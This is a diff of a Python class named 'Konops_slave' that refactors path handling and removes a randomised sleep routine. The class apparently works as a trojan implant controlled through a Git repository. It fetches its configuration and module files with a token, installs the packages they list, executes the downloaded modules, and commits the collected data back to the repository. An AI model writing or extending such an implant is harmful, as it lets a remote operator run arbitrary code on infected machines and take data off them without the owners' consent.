@@ -12,14 +12,9 @@ import types
 import random
 import subprocess
 
-#configuration path
-cpath="config/"
-#module path
-mpath="modules/"
-#data path
-dpath="data/"
+from konops import Konops
 
-class konops_slave:
+class Konops_slave(Konops):
     def __init__(self, konops_id):
         #Konops id
         self.konops_id = konops_id
@@ -40,7 +35,7 @@ class konops_slave:
     def configure(self):
         #Loads the configuration file. Returns its content.
 
-        config_file_path = cpath + self.konops_config
+        config_file_path = self.cpath + self.konops_config
         response , config_content_json = gitwrapper.get_file_contents(self.token, self.headers, config_file_path)
 
         self.configured = True
@@ -64,10 +59,6 @@ class konops_slave:
         self.get_requirements()
         for library in range(len(self.konops_requirements)):
             subprocess.check_call([sys.executable, '-m', 'pip', 'install', self.konops_requirements[library]])
-        
-    def sleep(self):
-        sleep_time = random.randint(120,1000)
-        time.sleep(sleep_time)
     
     def execute(self):
         #Executes the loaded modules.
@@ -77,7 +68,7 @@ class konops_slave:
         for task in range(len(self.konops_modules)):
 
             module_filename  = self.konops_modules[task]+".py"
-            module_path = mpath + module_filename
+            module_path = self.mpath + module_filename
             module_name = module_filename.strip(".py")
 
             #Get module file content
@@ -92,7 +83,7 @@ class konops_slave:
             print("result of " + module_filename + " is: '" + str(execution_result) + "'")
 
         time = str(datetime.datetime.now())
-        data_filename = dpath + self.konops_id + time + ".txt"
+        data_filename = self.dpath + self.konops_id + time + ".txt"
     
         commit_message = "Stored " + self.konops_id + " data."
         
